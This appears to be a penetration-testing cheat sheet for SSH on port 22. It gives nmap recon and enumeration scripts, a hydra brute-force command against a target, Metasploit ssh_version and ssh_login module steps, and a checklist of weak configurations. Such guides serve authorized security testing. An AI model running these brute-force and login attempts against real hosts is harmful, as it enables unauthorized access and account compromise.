Port 22 — SSH (Modern)

A guide to enumeration and exploitation

<--

0) What is SSH?

SSH (Secure Shell) is a protocol for secure remote access to systems, typically over port 22. It provides encrypted communication for shell access, file transfers (SFTP/SCP), and tunneling. Exploiting SSH can grant unauthorized access to systems or sensitive data.

1) Recon Phase 
nmap -sV -p 22 [targetip]
nmap --script ssh2-enum-algos [targetip]
nmap --script ssh-hostkey --script-args ssh_hostkey=full [targetip]

Use nmap to identify the SSH service version and supported algorithms. The ssh2-enum-algos script checks for weak ciphers or key exchange methods, while ssh-hostkey retrieves the server's public key for fingerprinting.

2) Enumeration Phase 
ssh [targetip] -l [username]
hydra -L users.txt -P passwords.txt ssh://[targetip]
nmap --script ssh-auth-methods --script-args="ssh.user=[username]" [targetip]

Test for valid usernames with ssh or enumerate supported authentication methods using nmap. Use hydra for authorized brute-force testing to identify weak passwords. Be cautious to avoid account lockouts or IP bans.

3) Exploitation Phase 
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS [targetip]
run
use auxiliary/scanner/ssh/ssh_login
set RHOSTS [targetip]
set USERNAME [username]
set PASSWORD [password]
run

In Metasploit, scan for SSH version details or attempt login with known credentials. If weak credentials are found, you can gain shell access. Check for outdated SSH versions vulnerable to known exploits (e.g., CVE-2016-6210 for user enumeration).

SSH Info — What to Look For
  • Weak or default credentials (e.g., root:admin)
  • Outdated SSH versions with known vulnerabilities
  • Weak key exchange algorithms or ciphers
  • Misconfigured SSH allowing password-based authentication instead of key-based

Tools Required

sudo apt install nmap hydra openssh-client
